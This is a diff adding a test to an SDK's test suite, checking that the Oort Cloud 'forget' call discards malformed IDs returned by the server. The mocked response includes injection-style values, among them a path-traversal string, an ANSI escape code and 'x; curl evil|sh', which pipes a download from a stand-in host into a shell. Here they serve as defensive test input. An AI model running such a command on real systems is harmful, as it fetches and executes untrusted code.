@@ -165,4 +165,20 @@ describe('oort.forget in Oort Cloud reports what it rewrote (CON-161)', () => {
     });
     await oort.close();
   });
+
+  it('sdk.cloud-forget-never-returns-an-id-that-is-not-a-memory-id (CON-161 review)', async () => {
+    const { oort } = await cloud((c) => {
+      c.forgetAnswer = {
+        rewritten: ['..', LATER, 'x; curl evil|sh'],
+        notRewritten: ['\u001b[31m', NEXT, 7],
+      };
+    });
+    expect(await oort.forget(ID)).toEqual({
+      forgotten: ID,
+      rewritten: [LATER],
+      notRewritten: [NEXT],
+      notRewrittenUnnamed: 2,
+    });
+    await oort.close();
+  });
 });
